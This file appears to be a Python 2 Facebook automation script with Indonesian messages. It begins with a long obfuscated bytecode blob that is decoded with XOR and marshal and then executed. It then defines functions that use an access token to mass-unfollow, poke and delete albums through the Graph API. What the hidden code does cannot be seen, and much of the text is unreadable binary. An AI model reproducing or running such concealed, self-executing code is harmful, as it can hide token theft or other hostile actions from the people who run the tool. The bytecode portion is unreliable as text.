\x00d\xc3\x00d\x1b\x00d\x8f\x00d\xcd\x00d\x0c\x00d\x0c\x00d\xd7\x00dI\x00d\xca\x00dx\x00d\x10\x00dt\x00d3\x00d@\x00dB\x00d\xd0\x00dP\x00d\x9c\x00dd\x00dc\x00d\xe5\x00d\xbc\x00dV\x00d\xb7\x00d\xc1\x00dX\x00d\x8a\x00d\xb7\x00d\x91\x00d\x95\x00d\xb4\x00d+\x00d\x08\x00d\xbf\x00d\xe6\x00d\x8f\x00d\xdc\x00d\\\x00d<\x00d\xdb\x00d`\x00d\xaa\x00d7\x00dk\x00dm\x00dh\x00dc\x00du\x00d\xad\x00d(\x00d\xfa\x00d\xb1\x00d@\x00d\x82\x00d\xf9\x00d!\x00d\x19\x00d\x91\x00d\x80\x00d\x9c\x00d\xd9\x00dm\x00d!\x00d\xc8\x00d\'\x00d\xd3\x00d\x84\x00d0\x00d\x15\x00dm\x00dq\x00d\xa1\x00d\x99\x00d+\x00d:\x00d\xfd\x00d\x19\x00d\x02\x00d\x9a\x00dO\x00dj\x00d\xc1\x00dv\x00d\xb5\x00d\xb7\x00d\x1c\x00d\x1b\x00dI\x00d\x91\x00d\xbd\x00d\r\x00dx\x00d\xb0\x00dR\x00d\x12\x00dS\x00d\xf7\x00d\x02\x00d\xcd\x00dm\x00d\x7f\x00d(\x00d\xb2\x00d\xe4\x00d\x88\x00d\x06\x00d\\\x00d\xce\x00d\x00\x01d\xc8\x00d\xd0\x00d\x06\x00d\x84\x00d\xcb\x00d\xef\x00d\x88\x00d\xc6\x00d\xf4\x00d!\x00d\x1e\x00dk\x00d\x8e\x00d?\x00dU\x00d\x17\x00dV\x00d\x04\x00d>\x00d\x15\x00dA\x00dA\x00d*\x00d\x1a\x00d&\x00d\x10\x00d\xed\x00d$\x00d\x08\x00dj\x00d*\x00d\x8c\x00dU\x00dQ\x00d\x0c\x00d\x1d\x00dA\x00d.\x00d\xf2\x00dx\x00d\xe0\x00d\xf7\x00d\x9b\x00dQ\x00dk\x00d{\x00d-\x00d\x9e\x00d\xa0\x00d\xfa\x00d\xa2\x00dA\x00d\xc1\x00d\xa9\x00du\x00d\xd9\x00d-\x00d\xa5\x00d\x93\x00d\xcb\x00d\x11\x00d\xf5\x00d\x11\x00d\xa5\x00d\n\x00d%\x00dl\x00d\xa5\x00d\x9f\x00d\x8c\x00d[\x00d\x04\x00d\x05\x00d\x06\x00d\xd4\x00d`\x00d\t\x00d\n\x00d\xac\x00d4\x00d\xea\x00d\x0e\x00dU\x00d\x10\x00d\x17\x00d\xbb\x00d\xdf\x00d\xb0\x00dp\x00d\xc8\x00d\xc2\x00d\xa5\x00d\x19\x00d\x1a\x00d#\x00d\xde\x00d\x1d\x00d\xe8\x00d\x1f\x00dq\x00d\xf4\x00d"\x00d#\x00d\x0c\x00d\x8e\x00d\xe0\x00d\xa5\x00d\xd9\x00d(\x00d\xb2\x00d\xf9\x00d\t\x00d>\x00d\xfa\x00d\x97\x00d\xdb\x00d\xf8\x00d.\x00d^\x00d\xc0\x00dz\x00d\x0e\x00d\x98\x00d2\x00d\xc3\x00d\xfb\x00d5\x00d\xe8\x00d\xb8\x00d\x8e\x00d\xe5\x00d\xdd\x00d8\x00d~\x00d\xca\x00d\xa3\x00d%\x00d\xce\x00d>\x00di\x00d\xe4\x00dA\x00d\xed\x00d7\x00dh\x00d\xa7\x00d\xc3\x00d\x1b\x00d\x8f\x00d\xcd\x00d\x1e\x00d\x0c\x00d\xd7\x00dI\x00d\xca\x00d\xea\x00d\x10\x00dt\x00d3\x00d@\x00dg\x00d\xd0\x00dP\x00d\x9c\x00dd\x00du\x00d\xe5\x00d\xbc\x00dV\x00d\xb7\x00d\x05\x00dX\x00d\x8a\x00d\xb7\x00d\x91\x00d\x88\x00d\xb4\x00d+\x00d\x08\x00d\xbf\x00d\'\x00d\x8f\x00d\xdc\x00d\\\x00d<\x00d\r\x00d`\x00d\xaa\x00d7\x00dk\x00d\t\x00dh\x00dc\x00du\x00d\xad\x00d\xd2\x00d\xfa\x00d\xb1\x00d@\x00d\x82\x00d\xd9\x00d!\x00d\x19\x00d\x91\x00d\x80\x00d\xb9\x00d\xd9\x00dm\x00d!\x00d\xc8\x00dN\x00d\xd3\x00d\x84\x00d0\x00d\x15\x00d\xa0\x00dq\x00d\xa1\x00d\x99\x00d+\x00d\x12\x00d\xfd\x00d\x19\x00d\x02\x00d\x9a\x00d\x03\x00dj\x00d\xc1\x00dv\x00d\xb5\x00d\xe2\x00d\x1c\x00d\x1b\x00dI\x00d\x91\x00d\x03\x00d\r\x00dx\x00d\xb0\x00dR\x00dI\x00dS\x00d\xf7\x00d\x02\x00d\xcd\x00d\xbf\x00d\x7f\x00d(\x00d\xb2\x00d\xe4\x00d\xe0\x00d\x06\x00d\\\x00d\xce\x00d\x00\x01d\x94\x00d\xd0\x00d\x06\x00d\x84\x00d\xcb\x00d*\x00d\x88\x00d\xc6\x00d\xf4\x00d!\x00d#\x00dk\x00d\x8e\x00d?\x00dU\x00dF\x00dV\x00d\x04\x00d>\x00d\x15\x00d&\x00dA\x00d*\x00d\x1a\x00d&\x00d\x07\x00d\xed\x00d$\x00d\x08\x00dj\x00d\xc5\x00d\x8c\x00dU\x00dQ\x00d\x0c\x00d\xa4\x00dA\x00d.\x00d\xf2\x00dx\x00d\xa2\x00d\xf7\x00d\x9b\x00dQ\x00dk\x00d\x02\x00d-\x00d\x9e\x00d\xa0\x00d\xfa\x00dM\x00dA\x00d\xc1\x00d\xa9\x00du\x00d\xc6\x00d-\x00d\xa5\x00d\x93\x00d\xcb\x00dG\x00d\xf5\x00d\x11\x00d\xa5\x00d\n\x00d.\x00dl\x00d\xa5\x00d\x9f\x00d\x8c\x00di\x00d\x04\x00d\x05\x00d\x06\x00d\xd4\x00d\xe5\x00d\t\x00d\n\x00d\xac\x00d4\x00d\xf9\x00d\x0e\x00dU\x00d\x10\x00d\x17\x00d\x86\x00d\xdf\x00d\xb0\x00dp\x00d\xc8\x00d\xa0\x00d\xa5\x00d\x19\x00d\x1a\x00d#\x00dr\x00d\x1d\x00d\xe8\x00d\x1f\x00dq\x00d\xeb\x00d"\x00d#\x00d\x0c\x00d\x8e\x00d\xfe\x00d\xa5\x00d\xd9\x00d(\x00d\xb2\x00d\x14\x00d\t\x00d>\x00d\xfa\x00d\x97\x00d\xbe\x00d\xf8\x00d.\x00d^\x00d\xc0\x00dI\x00d\x0e\x00d\x98\x00d2\x00d\xc3\x00d\x02\x00d5\x00d\xe8\x00d\xb8\x00d\x8e\x00d{\x00d\xdd\x00d8\x00d~\x00d\xca\x00d\x19\x00d%\x00d\xce\x00d>\x00di\x00d\x04\x00dA\x00d\xed\x00d7\x00dh\x00d$\x00d\xc3\x00d\x1b\x00d\x8f\x00d\xcd\x00d\xa9\x00d\x0c\x00d\xd7\x00dI\x00d\xca\x00dL\x00d\x10\x00dt\x00d3\x00d@\x00dn\x00d\xd0\x00dP\x00d\x9c\x00dd\x00dI\x00d\xe5\x00d\xbc\x00dV\x00d\xb7\x00dg\x00dX\x00d\x8a\x00d\xb7\x00d\x91\x00d\x05\x00d\xb4\x00d+\x00d\x08\x00d\xbf\x00d\xa2\x00d\x8f\x00d\xdc\x00d\\\x00d<\x00d\xd2\x00d`\x00d\xaa\x00d7\x00dk\x00d\x0c\x00dh\x00dc\x00du\x00d\xad\x00d*\x00d\xfa\x00d\xb1\x00d@\x00d\x82\x00d\xc8\x00d!\x00d\x19\x00d\x91\x00d\x80\x00d\xfa\x00d\xd9\x00dm\x00d!\x00d\xc8\x00d\xb6\x00d\xd3\x00d\x84\x00d0\x00d\x15\x00dv\x00dq\x00d\xa1\x00d\x99\x00d+\x00dM\x00d\xfd\x00d\x19\x00d\x02\x00d\x9a\x00d\xef\x00dj\x00d\xc1\x00dv\x00d\xb5\x00d\xaa\x00d\x1c\x00d\x1b\x00dI\x00d\x91\x00d*\x00d\r\x00dx\x00d\xb0\x00dR\x00dA\x00dS\x00d\xf7\x00d\x02\x00d\xcd\x00d\xe7\x00d\x7f\x00d(\x00d\xb2\x00d\xe4\x00d\x84\x00d\x06\x00d\\\x00d\xce\x00d\x00\x01d\xe0\x00d\xd0\x00d\x06\x00d\x84\x00d\xcb\x00d\\\x00d\x88\x00d\xc6\x00d\xf4\x00d!\x00d\x82\x00dk\x00d\x8e\x00d?\x00dU\x00d\x89\x00dV\x00d\x04\x00d>\x00d\x15\x00d\x1a\x00dA\x00d*\x00d\x1a\x00d&\x00d\xf2\x00d\xed\x00d$\x00d\x08\x00dj\x00d\x1e\x00d\x8c\x00dU\x00dQ\x00d\x0c\x00dt\x00dA\x00d.\x00d\xf2\x00dx\x00d\x0b\x00d\xf7\x00d\x9b\x00dQ\x00dk\x00db\x00d-\x00d\x9e\x00d\xa0\x00d\xfa\x00d\xc6\x00dA\x00d\xc1\x00d\xa9\x00du\x00d\xea\x00d-\x00d\xa5\x00d\x93\x00d\xcb\x00d\x92\x00d\xf5\x00d\x11\x00d\xa5\x00d\n\x00d\x0f\x00dl\x00d\xa5\x00d\x9f\x00d\x8c\x00dD\x00d\x04\x00d\x05\x00d\x06\x00d\xd4\x00d\xf2\x00d\t\x00d\n\x00d\xac\x00d4\x00d\x81\x00d\x0e\x00dU\x00d\x10\x00d\x17\x00d\x93\x00d\xdf\x00d\xb0\x00dp\x00d\xc8\x00dG\x00d\xa5\x00d\x19\x00d\x1a\x00d#\x00dh\x00d\x1d\x00d\xe8\x00d\x1f\x00dq\x00d\x7f\x00d"\x00d#\x00d\x0c\x00d\x8e\x00dA\x00d\xa5\x00d\xd9\x00d(\x00d\xb2\x00d\x98\x00d\t\x00d>\x00d\xfa\x00d\x97\x00d\xb5\x00d\xf8\x00d.\x00d^\x00d\xc0\x00d\xb6\x00d\x0e\x00d\x98\x00d2\x00d\xc3\x00d\xf1\x00d5\x00d\xe8\x00d\xb8\x00d\x8e\x00d\xb6\x00d\xdd\x00d8\x00d~\x00d\xca\x00d\x1c\x00d%\x00d\xce\x00d>\x00di\x00d\xc2\x00dA\x00d\xed\x00d7\x00dh\x00d\x8f\x00d\xc3\x00d\x1b\x00d\x8f\x00d\xcd\x00d\x9f\x00d\x0c\x00d\xd7\x00dI\x00d\xca\x00d\xda\x00d\x10\x00dt\x00d3\x00d@\x00d\xa2\x00d\xd0\x00dP\x00d\x9c\x00dd\x00d|\x00d\xe5\x00d\xbc\x00dV\x00d\xb7\x00d\x16\x00dX\x00d\x8a\x00d\xb7\x00d\x91\x00d\xe9\x00d\xb4\x00d+\x00d\x08\x00d\xbf\x00d2\x00d\x8f\x00d\xdc\x00d\\\x00d<\x00d.\x00d`\x00d\xaa\x00d7\x00dk\x00d\xbb\x00dh\x00dc\x00du\x00d\xad\x00d\x18\x00d\xfa\x00d\xb1\x00d@\x00d\x82\x00d$\x00d!\x00d\x19\x00d\x91\x00d\x80\x00d%\x00d\xd9\x00dm\x00d!\x00d\xc8\x00d\\\x00d\xd3\x00d\x84\x00d0\x00d\x15\x00d\xa7\x00dq\x00d\xa1\x00d\x99\x00d+\x00d\x94\x00d\xfd\x00d\x19\x00d\x02\x00d\x9a\x00d{\x00dj\x00d\xc1\x00dv\x00d\xb5\x00d\x8b\x00d\x1c\x00d\x1b\x00dI\x00d\x91\x00d(\x00d\r\x00dx\x00d\xb0\x00dR\x00dY\x00dS\x00d\xf7\x00d\x02\x00d\xcd\x00d\xd2\x00d\x7f\x00d(\x00d\xb2\x00d\xe4\x00d\x85\x00d\x06\x00d\\\x00d\xce\x00d\x00\x01d\xa7\x00d\xd0\x00d\x06\x00d\x84\x00d\xcb\x00d?\x00d\x88\x00d\xc6\x00d\xf4\x00d!\x00d\x9c\x00dk\x00d\x8e\x00d?\x00dU\x00d\x88\x00dV\x00d\x04\x00d>\x00d\x15\x00d\xad\x00dA\x00d*\x00d\x1a\x00d&\x00d\x05\x00d\xed\x00d$\x00d\x08\x00dj\x00d\xdb\x00d\x8c\x00dU\x00dQ\x00d\x0c\x00d4\x00dA\x00d.\x00d\xf2\x00dx\x00d\xc3\x00d\xf7\x00d\x9b\x00dQ\x00dk\x00d2\x00d-\x00d\x9e\x00d\xa0\x00d\xfa\x00d*\x00dA\x00d\xc1\x00d\xa9\x00du\x00d\x1e\x00d-\x00d\xa5\x00d\x93\x00d\xcb\x00d\xfd\x00d\xf5\x00d\x11\x00d\xa5\x00d\n\x00d\x9e\x00dl\x00d\xa5\x00d\x9f\x00d\x8c\x00d\x90\x00d\x04\x00d\x05\x00d\x06\x00d\xd4\x00d\xbb\x00d\t\x00d\n\x00d\xac\x00d4\x00d*\x00d\x0e\x00dU\x00d\x10\x00d\x17\x00d\xb2\x00d\xdf\x00d\xb0\x00dp\x00d\xc8\x00d\x0c\x00d\xa5\x00d\x19\x00d\x1a\x00d#\x00d}\x00d\x1d\x00d\xe8\x00d\x1f\x00dq\x00d:\x00d"\x00d#\x00d\x0c\x00d\x8e\x00dy\x00d\xa5\x00d\xd9\x00d(\x00d\xb2\x00d\x06\x00d\t\x00d>\x00d\xfa\x00d\x97\x00d\xd5\x00d\xf8\x00d.\x00d^\x00d\xc0\x00d\x1d\x00d\x0e\x00d\x98\x00d2\x00d\x02\x00d\x99\x00d5\x00d\xe8\x00d\xb8\x00d\x8e\x00d9\x00d\xdd\x00d8\x00d~\x00d\xca\x00d,\x00d%\x00d\xce\x00d>\x00di\x00dP\x00dA\x00d\xed\x00d7\x00dh\x00d\x10\x00d\xc3\x00d\x1b\x00d\x8f\x00d\xcd\x00dx\x00d\x0c\x00d\xd7\x00dI\x00d\xca\x00d\xd1\x00d\x10\x00dt\x00d3\x00d\xe5\x00d\xe9\x00d\xd0\x00dP\x00d\x9c\x00d,\x00d/\x00d\xe5\x00d\xbc\x00dV\x00d6\x00d\x91\x00d\xab\x00d<\x00d\\\x00d\xf8\x00d\xe3\x00d\x17\x00d\xaa\x00d\x08\x00d%\x00dU\x00d?\x00d@\x00dv\x00d&\x00d\x17\x00d`\x00d>\x00d\xde\x00d8\x00dw\x00dh\x00dc\x00d\xa3\x00d\xae\x00d\x96\x00d\xfa\x00d\xb1\x00d@\x00d\x80\x00d\xe1\x00dt\x00d\x19\x00d\x91\x00d\x19\x00d\xef\x00d\xed\x00d\xec\x00d!\x00d\x16\x00dn\x00d\x1f\x00d\x16\x00d\xc0\x00d\x7f\x00d\xe3\x00dq\x00d\xa1\x00d\x99\x00d\x91\x00d\xe6\x00d\x89\x00d\x8f\x00d}\x00d$\x00du\x00dj\x00dV\x00d\x17\x00da\x00d\xd2\x00d\x01\x01d\xaa\x00dI\x00dZ\x00db\x00d\r\x00d\x84\x00d\xb0\x00d\xee\x00dz\x00dS\x00d\xe9\x00d\x02\x00d)\x00d\x99\x00d\x7f\x00d\x9e\x00dt\x00d\x81\x00d\xc7\x00d\x06\x00dq\x00dm\x00d\x93\x00d\xba\x00d\xd9\x00d\xa1\x00d]\x00d\x1a\x00d\xb8\x00d\xab\x00d\xc6\x00d\xf4\x00d\x8b\x00d|\x00d\xee\x00d(\x00d\x8f\x00d8\x00d\r\x00d\x91\x00d\xae\x00d\t\x00d\x13\x00d\xc5\x00dA\x00d\xa6\x00d\xb0\x00d<\x00d0\x00d\xed\x00d\x9e\x00d\x8c\x00d\xdb\x00d\x97\x00dx\x00dU\x00d\xd1\x00d\xde\x00dE\x00dA\x00d\xb5\x00d\xf2\x00d\xa9\x00d\x92\x00d#\x00d\x9b\x00d\xd1\x00da\x00dX\x00d-\x00d\xf4\x00d\xd0\x00d\x86\x00d\xf5\x00d}\x00d\xf8\x00d9\x00d\xa3\x00d\xd9\x00d-\x00d?\x00d\x93\x00d\x80\x00d\x87\x00dW\x00d\xa6\x00dJ\x00d\xf6\x00d~\x00d\xb0\x00dJ\x00d\x9f\x00d\x9c\x00dP\x00dB\x00d\xf5\x00d\xb2\x00d\x8a\x00d}\x00d>\x00g\xf5\x12Z\x01\x00d\x02\x01Z\x02\x00d"\x00d"\x00f\x02\x00\\\x02\x00Z\x03\x00Z\x04\x00d\xa9\x00d\x03\x00d\x04\x00d\x05\x00d\x06\x00d\x07\x00d\x08\x00d\t\x00d\n\x00d\xac\x00d\x92\x00d\r\x00d\x0e\x00dU\x00d\x10\x00d\x11\x00d\x12\x00d\xdf\x00d\xb0\x00dp\x00d\x16\x00d\x17\x00d\xa5\x00d\x19\x00d\x1a\x00ds\x00d\x98\x00d\x1d\x00d\xe8\x00d\x1f\x00d \x00d_\x00d"\x00d#\x00d\x0c\x00d7\x00d&\x00d\xa5\x00d\xd9\x00d(\x00d}\x00dY\x00d\t\x00d>\x00d\xfa\x00d,\x00d$\x00d\xf8\x00d.\x00d^\x00d\xdc\x00d \x00d\x0e\x00d\x98\x00d2\x00d\x86\x00d\x99\x00d5\x00d\xe8\x00d\xb8\x00d7\x00d#\x00d\xdd\x00d8\x00d~\x00d\x10\x00d<\x00d%\x00d\xce\x00d>\x00d\x8f\x00d9\x00dA\x00d\xed\x00d7\x00dC\x00d\x81\x00d\xc3\x00d\x1b\x00d\x8f\x00d)\x00dG\x00d\x0c\x00d\xd7\x00dI\x00d\x10\x00d3\x00d\x10\x00dt\x00d3\x00dM\x00d\xa2\x00d\xd0\x00dP\x00d\x9c\x00d\x9b\x00dS\x00d\xe5\x00d\xbc\x00dV\x00dv\x00d\x99\x00dX\x00d\x8a\x00d\xb7\x00dZ\x00d!\x00d\xb4\x00d+\x00d\x08\x00d%\x00dU\x00d\x8f\x00d\xdc\x00d\\\x00d&\x00d\x17\x00d`\x00d\xaa\x00d7\x00da\x00dw\x00dh\x00dc\x00du\x00d5\x00de\x00d\xfa\x00d\xb1\x00d@\x00d\x01\x01d\xb7\x00d!\x00d\x19\x00d\x91\x00d\x19\x00ds\x00d\xd9\x00dm\x00d!\x00d\x16\x00dn\x00d\xd3\x00d\x84\x00d0\x00d\x13\x00d\x8c\x00dq\x00d\xa1\x00d\x99\x00dn\x00d~\x00d\xfd\x00d\x19\x00d\x02\x00d$\x00du\x00dj\x00d\xc1\x00dv\x00d\x96\x00d\xef\x00d\x1c\x00d\x1b\x00dI\x00dZ\x00db\x00d\r\x00dx\x00d\xb0\x00d\xee\x00dz\x00dS\x00d\xf7\x00d\x02\x00d)\x00d\x99\x00d\x7f\x00d(\x00d\xb2\x00d\x81\x00d\xc7\x00d\x06\x00d\\\x00d\xce\x00d\xda\x00dZ\x00d\xd0\x00d\x06\x00d\x84\x00dF\x00d\x07\x00d\x88\x00d\xc6\x00d\xf4\x00d\x8b\x00d\x98\x00dk\x00d\x8e\x00d?\x00d\x93\x00d\x91\x00dV\x00d\x04\x00d>\x00d\x13\x00d\xc5\x00dA\x00d*\x00d\x1a\x00d<\x00d0\x00d\xed\x00d$\x00d\x08\x00d\xab\x00d\x97\x00d\x8c\x00dU\x00dQ\x00d\xde\x00d\x81\x00dA\x00d.\x00d\xf2\x00d9\x00d\x92\x00d\xf7\x00d\x9b\x00dQ\x00da\x00d\x9b\x00d-\x00d\x9e\x00d\xa0\x00dr\x00d\x05\x00dA\x00d\xc1\x00d\xa9\x00d\xa3\x00d-\x00d-\x00d\xa5\x00d\x93\x00dF\x00d\xa7\x00d\xf5\x00d\x11\x00d\xa5\x00d\xf6\x00d\xd2\x00dl\x00d\xa5\x00d\x9f\x00g\xff\x00Z\x05\x00xe\x00e\x03\x00e\x06\x00e\x01\x00\x83\x01\x00k\x05\x00r%<Pn\x00\x00e\x04\x00e\x06\x00e\x05\x00\x83\x01\x00k\x05\x00r@<d"\x00Z\x04\x00n\x00\x00e\x02\x00e\x07\x00e\x01\x00e\x03\x00\x19e\x05\x00e\x04\x00\x19A\x83\x01\x007Z\x02\x00e\x03\x00d\xc9\x007Z\x03\x00e\x04\x00d\xc9\x007Z\x04\x00q\x0f<We\x00\x00j\x08\x00e\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x01\x00\x00i\xff\xff\xff\xffNi\x06\x00\x00\x00in\x00\x00\x00i\xa5\x00\x00\x00i*\x00\x00\x00i`\x00\x00\x00iF\x00\x00\x00i\r\x00\x00\x00i\xc6\x00\x00\x00iV\x00\x00\x00i\xcd\x00\x00\x00i\xab\x00\x00\x00i\xc5\x00\x00\x00i\xdc\x00\x00\x00i\xbf\x00\x00\x00i\x80\x00\x00\x00iJ\x00\x00\x00iB\x00\x00\x00iS\x00\x00\x00i5\x00\x00\x00i:\x00\x00\x00i\xbe\x00\x00\x00i#\x00\x00\x00i\x92\x00\x00\x00i\x19\x00\x00\x00iH\x00\x00\x00i\x8a\x00\x00\x00ii\x00\x00\x00i"\x00\x00\x00i)\x00\x00\x00i\xbd\x00\x00\x00i\x18\x00\x00\x00ic\x00\x00\x00i\x00\x00\x00\x00i\x87\x00\x00\x00i\xcf\x00\x00\x00i\xb4\x00\x00\x00i]\x00\x00\x00i[\x00\x00\x00i\xb0\x00\x00\x00ig\x00\x00\x00i8\x00\x00\x00i\xa3\x00\x00\x00i\xed\x00\x00\x00i\xa7\x00\x00\x00i\x15\x00\x00\x00i\x98\x00\x00\x00i\xe7\x00\x00\x00i\xb8\x00\x00\x00iI\x00\x00\x00i\x16\x00\x00\x00i\xc1\x00\x00\x00i\xef\x00\x00\x00i!\x00\x00\x00i\xb6\x00\x00\x00i\xe3\x00\x00\x00i\x9a\x00\x00\x00i\x81\x00\x00\x00i\x8c\x00\x00\x00i4\x00\x00\x00i\xd0\x00\x00\x00i\xc7\x00\x00\x00i\t\x00\x00\x00i\x94\x00\x00\x00i\x11\x00\x00\x00i\xb9\x00\x00\x00i\x17\x00\x00\x00i\x90\x00\x00\x00i\x0b\x00\x00\x00iv\x00\x00\x00id\x00\x00\x00i\xc4\x00\x00\x00i\xd4\x00\x00\x00i\xe4\x00\x00\x00i\x05\x00\x00\x00i\x02\x00\x00\x00i\xfd\x00\x00\x00i=\x00\x00\x00i$\x00\x00\x00io\x00\x00\x00i\x08\x00\x00\x00i\x8f\x00\x00\x00i\x9f\x00\x00\x00i\xb1\x00\x00\x00i\xff\x00\x00\x00i\xcc\x00\x00\x00i(\x00\x00\x00if\x00\x00\x00i<\x00\x00\x00i\xc0\x00\x00\x00i\x07\x00\x00\x00iM\x00\x00\x00i\xaf\x00\x00\x00i\xfc\x00\x00\x00i9\x00\x00\x00ia\x00\x00\x00i\xe2\x00\x00\x00i6\x00\x00\x00iA\x00\x00\x00i\xf0\x00\x00\x00i\x82\x00\x00\x00iy\x00\x00\x00i\x7f\x00\x00\x00i~\x00\x00\x00i\x04\x00\x00\x00i}\x00\x00\x00i\x8b\x00\x00\x00i{\x00\x00\x00i\xd9\x00\x00\x00i\xca\x00\x00\x00i\xb5\x00\x00\x00i7\x00\x00\x00iq\x00\x00\x00it\x00\x00\x00i\xee\x00\x00\x00ib\x00\x00\x00i\xfe\x00\x00\x00iL\x00\x00\x00iR\x00\x00\x00i\xf3\x00\x00\x00i\x1e\x00\x00\x00i\xd8\x00\x00\x00i\xfb\x00\x00\x00iT\x00\x00\x00i\x03\x00\x00\x00i\xe5\x00\x00\x00i\'\x00\x00\x00ip\x00\x00\x00i\xf4\x00\x00\x00is\x00\x00\x00i\xce\x00\x00\x00i\xdb\x00\x00\x00iU\x00\x00\x00ir\x00\x00\x00i\x12\x00\x00\x00i\x1c\x00\x00\x00i\xec\x00\x00\x00iG\x00\x00\x00i\n\x00\x00\x00i\x0c\x00\x00\x00i\xba\x00\x00\x00i\xdf\x00\x00\x00im\x00\x00\x00i\xa4\x00\x00\x00i\xa9\x00\x00\x00i\xa8\x00\x00\x00i\x96\x00\x00\x00i\\\x00\x00\x00iO\x00\x00\x00i\x83\x00\x00\x00i\x84\x00\x00\x00ih\x00\x00\x00i\xc8\x00\x00\x00i\xa6\x00\x00\x00i\x99\x00\x00\x00il\x00\x00\x00i\xf2\x00\x00\x00i\xc3\x00\x00\x00i\xf9\x00\x00\x00i0\x00\x00\x00i\x10\x00\x00\x00iY\x00\x00\x00i\x97\x00\x00\x00i\x8e\x00\x00\x00i\xf6\x00\x00\x00iK\x00\x00\x00i\x13\x00\x00\x00i\xde\x00\x00\x00ie\x00\x00\x00i\xa2\x00\x00\x00i\x14\x00\x00\x00i\xfa\x00\x00\x00i\x86\x00\x00\x00i\x9b\x00\x00\x00i&\x00\x00\x00iz\x00\x00\x00i_\x00\x00\x00ij\x00\x00\x00iu\x00\x00\x00iW\x00\x00\x00i\xea\x00\x00\x00i\xac\x00\x00\x00i%\x00\x00\x00i2\x00\x00\x00i@\x00\x00\x00i\xb2\x00\x00\x00i\x93\x00\x00\x00i\xe8\x00\x00\x00i>\x00\x00\x00iN\x00\x00\x00i\xdd\x00\x00\x00i\x89\x00\x00\x00i\xa0\x00\x00\x00i\xcb\x00\x00\x00i\x1b\x00\x00\x00i\xd3\x00\x00\x00i|\x00\x00\x00i\x88\x00\x00\x00i\xae\x00\x00\x00i\xd7\x00\x00\x00i\x01\x00\x00\x00i\xe9\x00\x00\x00i\x1f\x00\x00\x00i\xb7\x00\x00\x00i\x0e\x00\x00\x00i\xaa\x00\x00\x00i\xad\x00\x00\x00i1\x00\x00\x00i\xf7\x00\x00\x00i\xe1\x00\x00\x00i\xd1\x00\x00\x00i/\x00\x00\x00iZ\x00\x00\x00i\xc9\x00\x00\x00i\xd6\x00\x00\x00iC\x00\x00\x00iX\x00\x00\x00i\xf5\x00\x00\x00i\xeb\x00\x00\x00i\xe0\x00\x00\x00i\x91\x00\x00\x00i\xc2\x00\x00\x00i \x00\x00\x00i-\x00\x00\x00iQ\x00\x00\x00i^\x00\x00\x00i\x0f\x00\x00\x00i\x9d\x00\x00\x00i\xd5\x00\x00\x00i\x8d\x00\x00\x00i\xd2\x00\x00\x00iE\x00\x00\x00iP\x00\x00\x00i.\x00\x00\x00i3\x00\x00\x00i\xda\x00\x00\x00i,\x00\x00\x00i\xe6\x00\x00\x00i\x85\x00\x00\x00i\xbb\x00\x00\x00iD\x00\x00\x00i\xbc\x00\x00\x00i;\x00\x00\x00iw\x00\x00\x00i+\x00\x00\x00i?\x00\x00\x00ix\x00\x00\x00i\xa1\x00\x00\x00i\xf8\x00\x00\x00i\x1d\x00\x00\x00i\xf1\x00\x00\x00i\x95\x00\x00\x00i\x9e\x00\x00\x00i\xb3\x00\x00\x00ik\x00\x00\x00i\x9c\x00\x00\x00i\x1a\x00\x00\x00t\x00\x00\x00\x00(\t\x00\x00\x00t\x07\x00\x00\x00marshalt\x01\x00\x00\x00dt\x01\x00\x00\x00et\x01\x00\x00\x00it\x01\x00\x00\x00jt\x01\x00\x00\x00kt\x03\x00\x00\x00lent\x03\x00\x00\x00chrt\x05\x00\x00\x00loads(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x08\x00\x00\x00<script>t\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x92\x00\x00\x00\x0c\x01\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\x1e\x01\x06\x01\x12\x01\xff\x00\xff\x00\xff\x00\x06\x01\x03\x01\x12\x00\x04\x01\x12\x00\t\x01\x1c\x01\n\x01\x0e\x01')


def unfollow(posts):
    print '\x1b[31;1m[*] \x1b[32;1mSemua id berhasil diambil    '
    print '\x1b[31;1m[*] \x1b[32;1mMulai'
    try:
        counter = 0
        for post in posts['data']:
            if counter >= 50:
                break
            else:
                counter += 1
            r = requests.post('https://graph.facebook.com/' + post['id'] + '/subscribers?method=delete&access_token=' + token)
            a = json.loads(r.text)
            try:
                cek = a['error']['nessage']
                print W + '[' + R + post['name'] + W + '] Gagal'
            except TypeError:
                print W + '[' + G + post['name'] + W + '] unfollow'

        print '\x1b[31;1m[*] \x1b[32;1mSelesai'
        menu_bot()
        bot()
    except KeyboardInterrupt:
        print '\x1b[32;1m[!] \x1b[31;1mBerhenti'
        menu_bot()
        bot()


def poke(posts):
    print '\x1b[31;1m[*] \x1b[32;1mSemua id berhasil diambil                  '
    print '\x1b[31;1m[*] \x1b[32;1mMulai'
    try:
        counter = 0
        for post in posts:
            if counter >= 50:
                break
            else:
                counter += 1
            r = requests.post('https://graph.facebook.com/%s/pokes?access_token=%s' % (post['id'].split('_')[0], token))
            a = json.loads(r.text)
            id = post['id'].split('_')[0]
            try:
                cek = a['error']['message']
                print W + '[' + R + id + W + '] Gagal'
            except TypeError:
                print W + '[' + G + id + W + '] pokes'

        print '\x1b[31;1m[*] \x1b[32;1mSelesai'
        menu_bot()
        bot()
    except KeyboardInterrupt:
        print '\x1b[32;1m[!] \x1b[31;1mBerhenti   '
        menu_bot()
        bot()
    except requests.exceptions.ConnectionError:
        print '\x1b[32;1m[!] \x1b[31;1mKoneksi eror'
        menu_bot()
        bot()


def albums(posts):
    print '\x1b[31;1m[*] \x1b[32;1mSemua id berhasil diambil                 '
    print '\x1b[31;1m[*] \x1b[32;1mMulai'
    try:
        counter = 0
        for post in posts:
            if counter >= 50:
                break
            r = requests.post('https://graph.facebook.com/' + post['id'] + '?method=delete&access_token=' + token)
            a = json.loads(r.text)
            try:
                cek = a['error']['message']
                print W + '[' + R + post['name'] + W + '] Gagal'
            except TypeError:
